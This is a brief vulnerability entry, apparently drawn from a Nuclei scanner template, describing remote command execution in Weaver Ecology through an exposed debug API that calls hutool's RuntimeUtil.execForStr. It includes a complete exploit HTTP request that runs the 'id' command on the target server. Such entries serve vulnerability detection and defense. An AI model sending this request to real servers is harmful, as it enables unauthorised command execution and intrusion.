# Vulnerability: Weaver Ecology ExecForStr Remote Command Execution
**Classification:** WEAVER
**Source:** Nuclei Template (`ecology-execforstr-rce.yaml`)

## Description
Weaver Ecology exposes a debug API endpoint that allows invocation of `cn.hutool.core.util.RuntimeUtil.execForStr`, resulting in remote command execution. Successful exploitation allows an attacker to execute arbitrary operating system commands on the target server.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

[["id"]]
```

